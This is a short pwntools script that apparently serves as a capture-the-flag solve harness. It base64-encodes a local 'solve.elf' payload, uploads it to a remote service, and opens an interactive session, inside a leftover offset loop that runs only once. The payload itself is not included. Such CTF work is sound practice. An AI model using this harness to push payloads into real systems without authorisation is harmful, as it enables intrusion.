from pwn import *
from base64 import b64encode
from subprocess import run
import sys

context.log_level = 'info'

offset = 0

while abs(offset) <= 0:
    log.info(f"trying offset {offset:#x}")

    try:
        # run(f"./make.sh {offset}", shell=True, check=True, stdout=sys.stdout, stderr=sys.stderr)

        p = remote(args.HOST or "localhost", args.PORT or 5000)

        input("wait: ")

        data = b64encode(open("solve.elf", "rb").read())
        p.sendlineafter(b": ", data)

        p.interactive()
    except EOFError:
        pass
    finally:
        p.close()

    offset += 0x1000